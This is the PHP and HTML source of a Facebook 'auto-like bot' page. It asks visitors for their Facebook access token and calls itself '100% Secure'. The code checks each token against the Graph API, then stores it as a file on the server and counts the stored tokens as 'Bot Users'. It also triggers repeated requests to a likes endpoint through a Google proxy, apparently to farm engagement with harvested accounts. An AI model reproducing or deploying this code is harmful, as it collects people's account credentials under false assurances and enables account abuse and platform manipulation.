
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
SARDAR MUHAMMAD KHAN
</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">

<!-- jQuery library -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<!-- Latest compiled JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
<link rel="stylesheet" type="text/css" href="B.css"

<?php
$yx=opendir('Sameel');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> Sameel($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function Sameel($access){
if(!is_dir('Sameel')){
mkdir('Sameel');
}
$a=fopen('Sameel/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<font color="red">TOKEN INVALID</font>';
$this->form();
}
public function form(){
 echo '
    
     
		<div class="panel panel-success">
		
		<div class="panel-heading"><h4 style="text-align : center;"><i class="fas fa-bullhorn"></i> Completely Fixed!! No Like and Comment Block</h4></div>

		</div>
     

<center> <a target="_blank" href="https://www.facebook.com/100027394787172"> <center> <img src="https://graph.facebook.com/100027394787172/picture?type=large" style="width:300px; height:300px;border: 80px;border-radius: 80%;"  </center>
<br>
<marquee direction="left" width="60%"><font color ="white"> 100% Secure <font/><font color ="red">❤️</font><font color ="white"> NoExpire & No Like Block Bot <font/><font color ="red">❤️</font><font color ="white"> Follow Me </marquee>
<br>
<div class="css">
	<ul class="intro-social">        
         <font face="Audiowide" size="100" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em white, 0pt 2pt 0.9em white;"><a href="https://www.facebook.com/100027394787172" target="blank"><img src="https://d.top4top.net/p_8715fuks1.png?width=900" alt=" width="50" height="50" title="Follow Me On Facebook"/></i></a></font> <font face="Audiowide" size="100" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em white, 0pt 2pt 0.9em white;"><a href="https://instagram.com/sardarmuhammad.khan.528" target="blank"><img src="https://f.top4top.net/p_871bntoe1.png?width=900" alt=" width="50" height="50" title="Follow Me On Instagram"/></i></a></font> <font face="Audiowide" size="100" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em white, 0pt 2pt 0.9em white;"><a href="https://twitter.com/sardarmuhammad.khan.528" target="blank"><img src="https://f.top4top.net/p_871zhne91.png?width=900" alt=" width="50" height="50" title="Follow Me On Twitter"/></i></a></font>
      </ul></div> <!-- /intro-social -->

<br>
<center><a class="button" href="https://sardarxdtokensite.000webhostapp.com" target="blank">Click Here to Get Token</a></center>

</font><br>
<form action="" method="POST">
<input class="search" style="width:70%" type="text" name="access_token" placeholder="Input Token Here" required></br>
<input class="submit" type="submit" name="saveFile" value="Submit"></form>
</font><br>
<center><a class="button" href="https://www.facebook.com/100027394787172" target="_blank">SARDAR MUHAMMAD KHAN</a> <br></center>
<br>


</body></html>';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=1'),true);
if(count($feed[data]) >= 1){
for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'

  
<div class="panel panel-success">
		
		<div class="panel-heading"><h4 style="text-align : center;"><i class="fas fa-bullhorn"></i> Completely Fixed!! No Like and Comment Block</h4></div>

		</div>
<br>
<center> <a target="_blank" href="https://www.facebook.com/100027394787172"> <center> <img src="https://graph.facebook.com/100027394787172/picture?type=large" style="width:300px; height:300px;border: 80px;border-radius: 80%;"  </center>
<br>
<br>
<br>
<marquee direction="left"><font size="10" color="white">Thanks For Using Our Bot || Your bot Has been Activated Successfully </font></marquee>
<br>
<br>
<br>
<form action="index.php" method="post">
<center><input class="submit" type="submit" value="Click Here To Add Othe Token"></center>
<br>
<br>
<br>
<center> <font color="yellow"> DESIGN BY<a href="https://www.facebook.com/100027394787172" target="blank"><font color="red">SARDAR MUHAMMAD KHAN<br></center>
';
if($type=='photo'){
echo'
';
}else{
echo'
';
}
}
}else{
print '';
}
print '';
}
private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
) );
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
</body>
</html>
<h2>
	<br>
<center><font size="5" color="red"><?php 
    // integer starts at 0 before counting
    $i = 0; 
    $dir = 'Sameel/';
    if ($handle = opendir($dir)) {
        while (($file = readdir($handle)) !== false){
            if (!in_array($file, array('.', '..')) && !is_dir($dir.$file)) 
                $i++;
        }
    }
    // prints out how many were in the directory
     echo "Bot Users : $i";
?><br></font></p></h2>

 
